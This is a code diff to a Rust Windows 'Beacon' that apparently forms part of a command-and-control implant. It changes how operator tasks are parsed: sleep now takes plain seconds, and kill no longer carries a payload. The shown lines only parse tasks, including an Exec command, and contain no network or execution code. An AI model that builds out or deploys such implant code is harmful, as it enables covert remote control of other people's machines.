@@ -17,7 +17,7 @@ const JITTER_RATE: f64 = 0.5;
 pub enum Task {
     Exec(Vec<u8>),
     Sleep(std::time::Duration),
-    Kill(Vec<u8>),
+    Kill,
 }
 
 pub struct Beacon {
@@ -159,23 +159,14 @@ impl Beacon {
             }
             // sleep:[duration in seconds]
             "sleep" => {
-                let decoded = BASE64_STANDARD
-                    .decode(payload_str.as_bytes())
-                    .map_err(|_| windows::core::Error::from_win32())?;
-                let millis_str = String::from_utf8_lossy(&decoded);
-                let millis: u64 = millis_str
+                let seconds: u64 = payload_str
                     .parse()
                     .map_err(|_| windows::core::Error::from_win32())?;
-                Task::Sleep(Duration::from_millis(millis))
+                Task::Sleep(Duration::from_secs(seconds))
             }
             // kill:[idk yet]
             // payload shouldn't even exist for kill but whatever i'll deal with it later
-            "kill" => {
-                let decoded = BASE64_STANDARD
-                    .decode(payload_str.as_bytes())
-                    .map_err(|_| windows::core::Error::from_win32())?;
-                Task::Kill(decoded)
-            }
+            "kill" => Task::Kill,
             other => {
                 debug!("unknown task: {}", other);
                 return Err(windows::core::Error::from_win32());
